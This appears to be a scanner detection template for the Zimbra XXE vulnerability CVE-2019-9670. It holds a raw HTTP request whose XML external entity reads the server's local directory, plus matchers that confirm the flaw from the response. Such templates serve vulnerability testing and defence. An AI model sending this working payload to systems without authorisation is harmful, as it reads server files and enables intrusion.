id: poc-yaml-zimbra-cve-2019-9670-xxe

info:
  name: poc-yaml-zimbra-cve-2019-9670-xxe
  author: fnmsd(https://blog.csdn.net/fnmsd)
  severity: critical
  tags: xray-converted,xxe,cve-2019-9670,ct-21366
  reference:
    - https://blog.csdn.net/fnmsd/article/details/88657083
    - https://blog.csdn.net/fnmsd/article/details/89235589

http:
  - raw:
      - |
        POST /Autodiscover/Autodiscover.xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./" >]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "zmmailboxd.out"
          - "Requested response schema not available"